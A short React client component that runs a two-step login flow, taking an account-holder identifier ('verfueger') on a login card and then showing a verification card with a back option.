"use client";

import { useState } from "react";
import Header from "./Header";
import StepHeader from "./StepHeader";
import LoginCard from "./LoginCard";
import VerifyCard from "./VerifyCard";

export default function LoginFlow() {
  const [step, setStep] = useState<1 | 2>(1);
  const [verfueger, setVerfueger] = useState("");

  return (
    <>
      {step === 1 ? (
        <Header />
      ) : (
        <StepHeader verfueger={verfueger} onBack={() => setStep(1)} />
      )}
      <main className="flex-1 flex flex-col">
        {step === 1 ? (
          <LoginCard
            onSubmit={(value) => {
              setVerfueger(value);
              setStep(2);
            }}
          />
        ) : (
          <VerifyCard />
        )}
      </main>
    </>
  );
}
